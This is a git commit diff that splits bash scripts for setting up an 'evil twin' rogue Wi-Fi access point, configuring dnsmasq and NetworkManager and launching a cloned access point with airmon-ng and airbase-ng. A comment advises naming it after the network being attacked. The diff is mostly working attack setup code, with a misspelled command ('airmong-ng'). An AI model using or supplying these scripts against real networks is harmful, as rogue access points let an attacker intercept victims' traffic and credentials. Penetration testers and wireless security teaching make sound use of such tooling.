34687a687a7e73260de7968a6c8770fed2db7758
Julian <thefallingbird@gmail.com>
2020-04-23 22:52:16 +0000

    broke scripts into 3 parts

--- eviltwin/setup0.sh
+++ eviltwin/setup0.sh
@@ -1,9 +1,9 @@
 #! /bin/bash
 
-# this script sets up the evil twin
+# this script installs required packages and does some configuration setup
 
 UPDATE=false
-BRIDGE=wlan0 		# connected to internet, could be eth0 too
+BRIDGE=wlan0 			# connected to internet, could be eth0 too
 WLAN=wlan1			# monitor mode wirless adapter
 MON=mon
 WLANMON=$WLAN$MON
@@ -25,7 +25,7 @@ if [ "$UPDATE" = true ]; then
 fi
 	
 # Configure dns masq
-echo -e "\nConfiguring dnsmasq"
+echo -e "Configuring dnsmasq"
 mkdir /root/Desktop/eviltwin
 touch /root/Desktop/eviltwin/dnsmasq.conf
 echo "interface=at0
@@ -37,27 +37,12 @@ log-queries
 log-dhcp
 listen-address=127.0.0.1" >> /root/Desktop/eviltwin/dnsmasq.conf
 
-
-# Update NetworkManager.conf, Add these lines to the end: 
-echo -e "Configuring NetworkManager"
-echo "
+# check if the file was updated already
+COUNT=$(grep -c "unmanaged-devices:mac=AA:BB:CC:DD:EE:FF, A2:B2:C2:D2:E2:F2" /etc/NetworkManager/NetworkManager.conf)
+if [ $COUNT -eq 0 ]; then
+	# Update NetworkManager.conf, Add these lines to the end: 
+	echo -e "Configuring NetworkManager"
+	echo "
 [keyfile]
 unmanaged-devices:mac=AA:BB:CC:DD:EE:FF, A2:B2:C2:D2:E2:F2" >> /etc/NetworkManager/NetworkManager.conf
-
-
-# Connect the usb network adapter
-# 	see that it is connected with: iwconfig
-# 	It should be named wlan0 or wlan1
-
-# Enable the wireless adapter
-echo -e "Enabled $WLAN"
-ifconfig $WLAN up
-
-# create the monitor network interface
-echo -e "Creating $WLAN monitor interface"
-airmong-ng start $WLAN
-
-# start up the evil twin AP (access point)
-# 	Give the evil twin the same name as the network you are attacking for best results
-echo -e "starting evil twin"
-airbase-ng -e $ESSID -c $CHANNEL $WLANMON
+fi
---
+++ eviltwin/setup1.sh
@@ -0,0 +1,24 @@
+#! /bin/bash
+
+# this script sets up the evil twin
+
+UPDATE=false
+BRIDGE=wlan0 		# connected to internet, could be eth0 too
+WLAN=wlan1			# monitor mode wirless adapter
+MON=mon
+WLANMON=$WLAN$MON
+ESSID=TEST
+CHANNEL=11
+
+# Enable the wireless adapter
+echo -e "Enabled $WLAN"
+ifconfig $WLAN up
+
+# create the monitor network interface
+echo -e "Creating $WLAN monitor interface"
+airmong-ng start $WLAN
+
+# start up the evil twin AP (access point)
+# 	Give the evil twin the same name as the network you are attacking for best results
+echo -e "starting evil twin"
+airbase-ng -e $ESSID -c $CHANNEL $WLANMON
